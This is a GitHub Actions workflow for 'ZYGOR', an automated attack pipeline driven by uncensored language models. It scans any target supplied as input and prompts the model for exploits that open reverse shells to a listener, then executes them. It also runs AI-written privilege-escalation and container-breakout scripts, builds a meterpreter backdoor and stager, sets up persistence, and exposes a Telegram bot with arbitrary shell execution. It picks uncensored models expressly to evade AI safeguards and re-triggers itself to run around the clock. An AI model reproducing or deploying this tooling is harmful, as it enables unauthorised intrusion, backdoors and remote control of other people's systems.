name: ZYGOR – AI-PENTEST SUPREME v3.0 (Infinite)

on:
  schedule:
    # Run every 6 hours to maintain continuous operation (max 6h per run)
    - cron: '0 */6 * * *'
  workflow_dispatch:
    inputs:
      target:
        description: "🎯 Target IP range, subnet, domain, or single host"
        required: true
        default: "127.0.0.1"
      lhost:
        description: "🎭 Your listener IP (LHOST) for reverse shells"
        required: false
        default: ""
      lport:
        description: "🎭 Listener port (LPORT) for reverse shells"
        required: false
        default: "4444"
      ai_model:
        description: "🧠 Ollama uncensored model (will be auto‑pulled)"
        required: true
        default: "dolphin-mixtral"
        type: choice
        options:
          - dolphin-mixtral
          - wizard-vicuna-uncensored
          - hermes-3-llama-3.2-uncensored
          - llama3.1:8b-uncensored
          - mistral
          - mixtral
          - nous-hermes-2-mixtral-8x7b-dpo
      penetration_phase:
        description: "⚡ Attack phase(s) to execute"
        required: true
        default: "full"
        type: choice
        options:
          - recon
          - exploitation
          - web_forge
          - full
      enable_exfiltration:
        description: "⚠️ Enable exfiltration / persistence simulation (requires approval)"
        required: true
        default: "false"
        type: choice
        options:
          - "true"
          - "false"
      run_duration_hours:
        description: "⏳ Max run time (self‑hosted runners can go 6h)"
        required: true
        default: "6"
        type: choice
        options:
          - "1"
          - "2"
          - "3"
          - "4"
          - "5"
          - "6"
      github_token_for_abort:
        description: "🔑 (Optional) PAT or GitHub token to allow /abort command via API"
        required: false
        default: ""
      enable_chat_ops:
        description: "🤖 Enable interactive AI chat via GitHub Issues"
        required: false
        default: "true"
        type: choice
        options:
          - "true"
          - "false"
      chat_issue_number:
        description: "📌 GitHub Issue number to use for chat commands"
        required: false
        default: "1"
      backup_provider:
        description: "💾 Cloud backup provider for artifacts"
        required: false
        default: "none"
        type: choice
        options:
          - none
          - s3
          - gcs
          - azure
      telegram_enable:
        description: "📱 Enable Telegram bot control"
        required: false
        default: "false"
        type: choice
        options:
          - "true"
          - "false"
      telegram_chat_id:
        description: "🆔 Telegram chat ID to listen/send messages"
        required: false
        default: ""

permissions:
  contents: write
  actions: write
  issues: write
  pull-requests: write

env:
  OLLAMA_HOST: "0.0.0.0:11434"
  OLLAMA_READ_TIMEOUT: "3600"
  OLLAMA_KEEP_ALIVE: "24h"
  TARGET: ${{ github.event.inputs.target || '127.0.0.1' }}
  LHOST: ${{ github.event.inputs.lhost || '' }}
  LPORT: ${{ github.event.inputs.lport || '4444' }}
  AI_MODEL: ${{ github.event.inputs.ai_model || 'dolphin-mixtral' }}
  PHASE: ${{ github.event.inputs.penetration_phase || 'full' }}
  ENABLE_EXFIL: ${{ github.event.inputs.enable_exfiltration || 'false' }}
  MAX_HOURS: ${{ github.event.inputs.run_duration_hours || '6' }}
  GITHUB_TOKEN_ABORT: ${{ github.event.inputs.github_token_for_abort || secrets.GITHUB_TOKEN }}
  CHAT_OPS: ${{ github.event.inputs.enable_chat_ops || 'false' }}
  CHAT_ISSUE: ${{ github.event.inputs.chat_issue_number || '1' }}
  BACKUP_PROVIDER: ${{ github.event.inputs.backup_provider || 'none' }}
  TELEGRAM_ENABLE: ${{ github.event.inputs.telegram_enable || 'false' }}
  TELEGRAM_CHAT_ID: ${{ github.event.inputs.telegram_chat_id || '' }}
  # Telegram bot token stored in secrets
  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}

jobs:
  # ======================================================================
  # ∞ BOOTSTRAP: AI Engine, Caching, Tools, Telegram Bot & Infinite Loop
  # ======================================================================
  bootstrap:
    name: "⚡ ZYGOR Infinite Bootstrap"
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    outputs:
      ai_ready: ${{ steps.ai-status.outputs.ok }}
    steps:
      # ------------------------------------------------------------------
      # 0. Cache Ollama models
      # ------------------------------------------------------------------
      - name: "🧠 Restore Ollama model cache"
        id: cache-models
        uses: actions/cache@v4
        with:
          path: /home/runner/.ollama/models
          key: ollama-models-${{ env.AI_MODEL }}-v3
          restore-keys: |
            ollama-models-${{ env.AI_MODEL }}-
            ollama-models-

      # ------------------------------------------------------------------
      # 1. Install all offensive toolchain (Ubuntu native)
      # ------------------------------------------------------------------
      - name: "📦 Install offensive toolchain (Ubuntu / Debian)"
        shell: bash
        run: |
          sudo apt-get update -qq
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            curl wget git unzip jq python3 python3-pip python3-dev \
            build-essential gcc g++ clang cmake make \
            nmap masscan arp-scan netcat-openbsd \
            metasploit-framework nuclei seclists \
            john hashcat hashid \
            ffuf sqlmap xsser ldap-utils bloodhound \
            docker.io podman avml \
            aircrack-ng reaver bully \
            perl ruby-full \
            golang rustc cargo \
            mingw-w64 nasm \
            libpcap-dev libssl-dev libffi-dev \
            patchelf binutils \
            mitm6 responder evilginx2 \
            kerberoast impacket-scripts \
            cherrytree reportlab 2>/dev/null || true
          pip3 install --quiet --break-system-packages \
            pwntools impacket requests beautifulsoup4 lxml shodan censys \
            python-nmap bloodhound-ce python-ldap pyOpenSSL paramiko \
            telegram python-telegram-bot aiohttp

      # ------------------------------------------------------------------
      # 2. Start Ollama, pull model, keep-alive
      # ------------------------------------------------------------------
      - name: "🚀 Launch Ollama with auto‑heal keep‑alive"
        shell: bash
        run: |
          sudo mkdir -p /var/log/zygor
          export OLLAMA_HOST="${OLLAMA_HOST}"
          ollama serve > /var/log/zygor/ollama.log 2>&1 &
          for i in {1..40}; do
            if curl -s http://localhost:11434/api/tags >/dev/null 2>&1; then break; fi
            sleep 2
          done
          ollama pull ${AI_MODEL} || true
          (while true; do curl -s http://localhost:11434/api/tags >/dev/null; sleep 30; done) & disown

      # ------------------------------------------------------------------
      # 3. AI self-healing wrapper (Groq/Gemini fallback)
      # ------------------------------------------------------------------
      - name: "🧬 Build AI completion engine"
        id: ai-status
        shell: bash
        run: |
          mkdir -p /opt/zygor/bin
          cat > /opt/zygor/bin/ai_complete <<'AISCRIPT'
          #!/bin/bash
          prompt="$(cat -)"
          max_tokens="${1:-2048}"
          for i in $(seq 1 10); do
            resp=$(curl -s -X POST http://localhost:11434/api/generate -d "{
              \"model\": \"$AI_MODEL\",
              \"prompt\": $(echo "$prompt" | jq -Rs .),
              \"stream\": false,
              \"options\": { \"num_predict\": $max_tokens, \"temperature\": 0.7, \"repeat_penalty\": 1.1 }
            }" --max-time 900)
            if echo "$resp" | jq -e '.response' >/dev/null 2>&1; then
              echo "$resp" | jq -r '.response'
              exit 0
            fi
            sleep 5
          done
          # Fallback to Groq
          if [ -n "$GROQ_API_KEY" ]; then
            resp=$(curl -s -X POST "https://api.groq.com/openai/v1/chat/completions" \
              -H "Authorization: Bearer $GROQ_API_KEY" \
              -H "Content-Type: application/json" \
              -d "{\"model\": \"mixtral-8x7b-32768\", \"messages\":[{\"role\":\"user\",\"content\": $(echo "$prompt" | jq -Rs .)}], \"max_tokens\": $max_tokens}" --max-time 600)
            echo "$resp" | jq -r '.choices[0].message.content // empty'
            exit 0
          fi
          # Fallback to Gemini
          if [ -n "$GEMINI_API_KEY" ]; then
            resp=$(curl -s -X POST "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent?key=$GEMINI_API_KEY" \
              -H "Content-Type: application/json" \
              -d "{\"contents\":[{\"parts\":[{\"text\":$(echo "$prompt" | jq -Rs .)}]}]}" --max-time 600)
            echo "$resp" | jq -r '.candidates[0].content.parts[0].text // empty'
            exit 0
          fi
          echo "ERROR: No AI backend available." >&2
          exit 1
          AISCRIPT
          chmod +x /opt/zygor/bin/ai_complete
          echo "ok=true" >> $GITHUB_OUTPUT

      # ------------------------------------------------------------------
      # 4. Telegram Bot integration (if enabled)
      # ------------------------------------------------------------------
      - name: "📱 Telegram Bot listener (background)"
        if: ${{ env.TELEGRAM_ENABLE == 'true' && env.TELEGRAM_BOT_TOKEN != '' }}
        shell: bash
        run: |
          # Launch Python bot that listens for commands and invokes AI tools
          cat > /opt/zygor/bin/telegram_bot.py <<'PYEOF'
          import asyncio, os, subprocess, logging
          from telegram import Update
          from telegram.ext import Application, CommandHandler, ContextTypes

          logging.basicConfig(level=logging.INFO)
          TOKEN = os.environ['TELEGRAM_BOT_TOKEN']
          CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')

          async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
              await update.message.reply_text("ZYGOR AI Pentest Bot online. Use /help for commands.")

          async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
              await update.message.reply_text("""
          /scan <target> - Run Nmap and AI analysis
          /exploit <target> - Generate and run AI exploit
          /webforge <description> - Build full-stack web app
          /recon <target> - Full recon
          /exec <command> - Execute shell command (approved only)
          /status - Current status
          /abort - Stop all operations
          """)

          async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
              target = ' '.join(context.args)
              if not target:
                  await update.message.reply_text("Usage: /scan <target>")
                  return
              await update.message.reply_text(f"Scanning {target}...")
              proc = await asyncio.create_subprocess_exec(
                  'nmap', '-T4', '-A', '-p-', target,
                  stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
              )
              stdout, stderr = await proc.communicate()
              output = stdout.decode()[:3000]
              await update.message.reply_text(f"Scan results:\n```\n{output}\n```", parse_mode='Markdown')

          async def exploit(update: Update, context: ContextTypes.DEFAULT_TYPE):
              target = ' '.join(context.args)
              if not target:
                  await update.message.reply_text("Usage: /exploit <target>")
                  return
              await update.message.reply_text(f"Generating exploit for {target}...")
              prompt = f"Write a Python3 exploit for target {target} with a reverse shell to {os.environ['LHOST']}:{os.environ['LPORT']}. Output only code."
              code = subprocess.check_output(['/opt/zygor/bin/ai_complete'], input=prompt.encode()).decode()
              with open('/tmp/telegram_exploit.py', 'w') as f:
                  f.write(code)
              os.chmod('/tmp/telegram_exploit.py', 0o755)
              proc = await asyncio.create_subprocess_exec('python3', '/tmp/telegram_exploit.py')
              await update.message.reply_text("Exploit launched.")

          async def exec_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
              if os.environ.get('ENABLE_EXFIL') != 'true':
                  await update.message.reply_text("Exfiltration mode not enabled.")
                  return
              cmd = ' '.join(context.args)
              proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
              stdout, stderr = await proc.communicate()
              await update.message.reply_text(f"Output:\n{stdout.decode()[:2000]}")

          async def abort(update: Update, context: ContextTypes.DEFAULT_TYPE):
              await update.message.reply_text("Aborting all operations...")
              subprocess.call(['curl', '-X', 'POST', '-H', f"Authorization: token {os.environ['GITHUB_TOKEN_ABORT']}",
                               f"https://api.github.com/repos/{os.environ['GITHUB_REPOSITORY']}/actions/runs/{os.environ['GITHUB_RUN_ID']}/cancel"])

          async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
              await update.message.reply_text("AI engine online, all systems nominal.")

          def main():
              app = Application.builder().token(TOKEN).build()
              app.add_handler(CommandHandler("start", start))
              app.add_handler(CommandHandler("help", help_cmd))
              app.add_handler(CommandHandler("scan", scan))
              app.add_handler(CommandHandler("exploit", exploit))
              app.add_handler(CommandHandler("exec", exec_cmd))
              app.add_handler(CommandHandler("abort", abort))
              app.add_handler(CommandHandler("status", status))
              logging.info("Telegram bot polling...")
              app.run_polling()

          if __name__ == '__main__':
              main()
          PYEOF
          python3 /opt/zygor/bin/telegram_bot.py &

      # ------------------------------------------------------------------
      # 5. Infinite loop – re-trigger workflow before timeout
      # ------------------------------------------------------------------
      - name: "∞ Self‑re‑trigger to ensure 24/7 operation"
        if: ${{ github.event_name == 'schedule' || github.event_name == 'workflow_dispatch' }}
        shell: bash
        run: |
          # 30 min before 6h timeout, trigger a new workflow run
          sleep 19800 &  # 5h30min
          # Wait or just spawn background task to do it
          (sleep 19800
           curl -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                -H "Accept: application/vnd.github.v3+json" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/zygor.yml/dispatches" \
                -d '{"ref":"main","inputs":{"target":"'${TARGET}'","lhost":"'${LHOST}'","lport":"'${LPORT}'","ai_model":"'${AI_MODEL}'","penetration_phase":"'${PHASE}'","enable_exfiltration":"'${ENABLE_EXFIL}'","run_duration_hours":"6","enable_chat_ops":"'${CHAT_OPS}'","telegram_enable":"'${TELEGRAM_ENABLE}'","telegram_chat_id":"'${TELEGRAM_CHAT_ID}'"}}' 2>/dev/null
          ) & disown

  # ======================================================================
  # 🛡️ Abort Watchdog (continuous)
  # ======================================================================
  abort_watchdog:
    name: "🛡️ Abort Listener"
    needs: bootstrap
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    if: ${{ always() && env.GITHUB_TOKEN_ABORT != '' }}
    steps:
      - name: "🔍 Watch for /abort command"
        shell: bash
        run: |
          while true; do
            comments=$(curl -s -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/comments?per_page=10&sort=updated" 2>/dev/null)
            body=$(echo "$comments" | jq -r '.[0].body // ""')
            if echo "$body" | grep -qi '/abort'; then
              echo "🛑 ABORT signal received."
              curl -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/cancel"
              exit 0
            fi
            sleep 30
          done

  # ======================================================================
  # 📡 Reconnaissance (5 parallel modules)
  # ======================================================================
  reconnaissance:
    name: "🔍 Phase 1 – Reconnaissance"
    needs: bootstrap
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    if: ${{ github.event.inputs.penetration_phase == 'recon' || github.event.inputs.penetration_phase == 'full' || github.event_name == 'schedule' }}
    strategy:
      fail-fast: false
      matrix:
        module: [network_scan, web_discovery, ad_enum, wireless_survey, osint_gather]
    steps:
      - name: "Load AI tooling"
        run: export PATH="/opt/zygor/bin:$PATH"

      - name: "Network Scan"
        if: matrix.module == 'network_scan'
        run: |
          nmap -T4 -A -p- -oX /tmp/nmap.xml $TARGET
          masscan $TARGET --ports=1-65535 --rate=10000 -oX /tmp/masscan.xml || true
          sudo arp-scan --localnet -f /tmp/arp_scan.txt || true
          cat /tmp/nmap.xml | ai_complete "List exploitable services and CVEs (format: SERVICE:CVE-ID)" > /tmp/ai_cves.txt

      - name: "Web Discovery"
        if: matrix.module == 'web_discovery'
        run: |
          subfinder -d $TARGET -o /tmp/subdomains.txt 2>/dev/null || true
          whatweb $TARGET > /tmp/whatweb.txt || true
          ffuf -u https://${TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o /tmp/ffuf.json -of json 2>/dev/null || true
          ai_complete "Generate custom fuzzing wordlist based on: $(head -c 1000 /tmp/whatweb.txt)" > /tmp/ai_wordlist.txt
          ffuf -u https://${TARGET}/FUZZ -w /tmp/ai_wordlist.txt -o /tmp/ffuf_ai.json -of json 2>/dev/null || true

      - name: "AD/LDAP Enum"
        if: matrix.module == 'ad_enum'
        run: |
          ldapsearch -x -h $TARGET -p 389 -s base -b "" > /tmp/ldap_base.txt 2>/dev/null || echo "LDAP not accessible"
          bloodhound-python -d $TARGET -u guest -p '' -ns $TARGET -c all --zip -o /tmp/bloodhound 2>/dev/null || true

      - name: "Wireless Survey"
        if: matrix.module == 'wireless_survey'
        run: |
          iface=$(iw dev | awk '/Interface/{print $2}' | head -1)
          if [ -n "$iface" ]; then
            sudo airmon-ng start $iface
            sudo airodump-ng ${iface}mon -w /tmp/airodump --output-format csv &
            sleep 30
            sudo pkill airodump-ng
          else
            echo "No wireless interface."
          fi

      - name: "OSINT Gather"
        if: matrix.module == 'osint_gather'
        run: |
          if [ -n "$SHODAN_API_KEY" ]; then
            shodan search "hostname:$TARGET" --fields ip_str,port,org,data > /tmp/shodan.txt || true
          fi
          ai_complete "OSINT on target $TARGET: list emails, subdomains, breaches" > /tmp/ai_osint.txt

      - name: "Upload artifacts"
        uses: actions/upload-artifact@v4
        with:
          name: recon-${{ matrix.module }}
          path: /tmp/*.{txt,xml,json,csv,pcap,zip}

  # ======================================================================
  # 💥 Exploitation (8 parallel attack vectors)
  # ======================================================================
  exploitation:
    name: "💥 Phase 2 – Exploitation"
    needs: [bootstrap, reconnaissance]
    if: ${{ github.event.inputs.penetration_phase == 'exploitation' || github.event.inputs.penetration_phase == 'full' || github.event_name == 'schedule' }}
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    strategy:
      max-parallel: 4
      matrix:
        attack: [ai_exploit_gen, metasploit_rc, web_sqli_xss, password_cracking, container_breakout, privilege_escalation, lateral_movement, backdoor_creation]
    steps:
      - run: export PATH="/opt/zygor/bin:$PATH"

      - if: matrix.attack == 'ai_exploit_gen'
        run: |
          while read -r service cve; do
            ai_complete "Write Python3 exploit for $cve on $TARGET, reverse shell to ${LHOST}:${LPORT}. Output code." > /tmp/exploit_${cve}.py
            chmod +x /tmp/exploit_${cve}.py
            [ "$ENABLE_EXFIL" == "true" ] && timeout 30 python3 /tmp/exploit_${cve}.py &
          done < /tmp/ai_cves.txt

      - if: matrix.attack == 'metasploit_rc'
        run: |
          ai_complete "Generate msfconsole resource script for all services in $(head -c 3000 /tmp/nmap.xml)" > /tmp/msf.rc
          msfconsole -q -r /tmp/msf.rc || true

      - if: matrix.attack == 'web_sqli_xss'
        run: |
          urls=$(jq -r '.results[].url' /tmp/ffuf_ai.json | head -10)
          for url in $urls; do sqlmap -u "$url" --batch --risk=3 --level=5 --random-agent --output-dir=/tmp/sqlmap; done
          xsser --url "https://${TARGET}" --auto --output /tmp/xsser.txt || true

      - if: matrix.attack == 'password_cracking'
        run: |
          echo 'admin:$1$salt$hash' > /tmp/hashes.txt
          ai_complete "Generate John the Ripper rules for company $TARGET" > /tmp/rules.conf
          john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/tmp/rules.conf /tmp/hashes.txt || true

      - if: matrix.attack == 'container_breakout'
        run: |
          if [ -f /.dockerenv ]; then
            ai_complete "Docker privileged container breakout commands" > /tmp/breakout.sh
            bash /tmp/breakout.sh || true
          fi

      - if: matrix.attack == 'privilege_escalation'
        run: |
          uname -a > /tmp/sysinfo.txt; id >> /tmp/sysinfo.txt
          ai_complete "Linux privesc based on: $(cat /tmp/sysinfo.txt)" > /tmp/privesc.sh
          bash /tmp/privesc.sh || true

      - if: matrix.attack == 'lateral_movement'
        run: |
          ai_complete "Impacket pass-the-hash script to $TARGET, reverse shell to ${LHOST}:${LPORT}" > /tmp/pth.py
          [ "$ENABLE_EXFIL" == "true" ] && python3 /tmp/pth.py || true

      - if: matrix.attack == 'backdoor_creation'
        run: |
          msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o /tmp/backdoor.elf 2>/dev/null
          ai_complete "C stager that downloads and runs /tmp/backdoor.elf" > /tmp/stager.c
          gcc /tmp/stager.c -o /tmp/stager
          [ "$ENABLE_EXFIL" == "true" ] && (cp /tmp/stager /tmp/persist; chmod 777 /tmp/persist)

      - uses: actions/upload-artifact@v4
        with:
          name: exploits-${{ matrix.attack }}
          path: /tmp/exploit_*.py

  # ======================================================================
  # 🌐 Web Forge (AI Full-Stack Builder)
  # ======================================================================
  web_forge:
    name: "🌐 Phase 3 – Web Forge"
    needs: bootstrap
    if: ${{ github.event.inputs.penetration_phase == 'web_forge' || github.event.inputs.penetration_phase == 'full' || github.event_name == 'schedule' }}
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    steps:
      - run: export PATH="/opt/zygor/bin:$PATH"
      - run: |
          ai_complete "Full-stack collaborative whiteboard: React+Node+PostgreSQL+WebSockets+Docker+K8s. Output file tree with # FILE: comments." > /tmp/webforge.txt
          cd /tmp && mkdir project && cd project && git init
          python3 -c "
          import os, re
          content = open('/tmp/webforge.txt').read()
          current = None
          lines = []
          for line in content.split('\n'):
              if line.startswith('# FILE:'):
                  if current:
                      os.makedirs(os.path.dirname(current), exist_ok=True)
                      with open(current, 'w') as f: f.write('\n'.join(lines))
                  current = line.split('# FILE:')[1].strip()
                  lines = []
              else:
                  lines.append(line)
          if current:
              os.makedirs(os.path.dirname(current), exist_ok=True)
              with open(current, 'w') as f: f.write('\n'.join(lines))
          "
          git add . && git commit -m "AI full-stack app"
      - uses: actions/upload-artifact@v4
        with:
          name: web-forge-project
          path: /tmp/project

  # ======================================================================
  # 🤖 ChatOps (GitHub Issues + Telegram integration)
  # ======================================================================
  chat_ops:
    name: "💬 AI ChatOps (Issue/Telegram)"
    needs: bootstrap
    if: ${{ github.event.inputs.enable_chat_ops == 'true' || github.event_name == 'schedule' }}
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    steps:
      - run: |
          export PATH="/opt/zygor/bin:$PATH"
          while true; do
            comments=$(curl -s -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${CHAT_ISSUE}/comments?per_page=1&sort=updated")
            last_body=$(echo "$comments" | jq -r '.[0].body // ""')
            if echo "$last_body" | grep -q '^/chat'; then
              query=$(echo "$last_body" | sed 's/^\/chat[[:space:]]*//')
              answer=$(echo "$query" | ai_complete 1024)
              curl -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                -H "Content-Type: application/json" \
                -d "{\"body\": \"$answer\"}" \
                "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${CHAT_ISSUE}/comments"
            fi
            sleep 30
          done

  # ======================================================================
  # 💾 Backup Orchestrator
  # ======================================================================
  backup:
    name: "💾 Backup to Cloud"
    needs: [bootstrap, reconnaissance, exploitation, web_forge]
    if: ${{ github.event.inputs.backup_provider != 'none' || github.event_name == 'schedule' }}
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    steps:
      - run: |
          case "$BACKUP_PROVIDER" in
            s3) aws s3 cp /tmp/artifacts s3://zygor-backups/ --recursive --quiet ;;
            gcs) gsutil cp -r /tmp/artifacts gs://zygor-backups/ ;;
            azure) azcopy copy /tmp/artifacts "https://zygorblob.blob.core.windows.net/backups" --recursive ;;
          esac

  # ======================================================================
  # 📊 Final Executive Report
  # ======================================================================
  report:
    name: "📊 ZYGOR Executive Report"
    needs: [bootstrap, reconnaissance, exploitation, web_forge, chat_ops, backup]
    if: always()
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    steps:
      - name: "Merge logs and generate AI report"
        run: |
          mkdir -p /tmp/final
          cp /tmp/*.{txt,xml,json} /tmp/final/ 2>/dev/null || true
          ai_complete "Penetration test executive summary and remediation from data: $(cat /tmp/final/* 2>/dev/null | head -c 5000)" > /tmp/final/EXECUTIVE_SUMMARY.md
      - uses: actions/upload-artifact@v4
        with:
          name: ZYGOR-Complete-Report
          path: /tmp/final
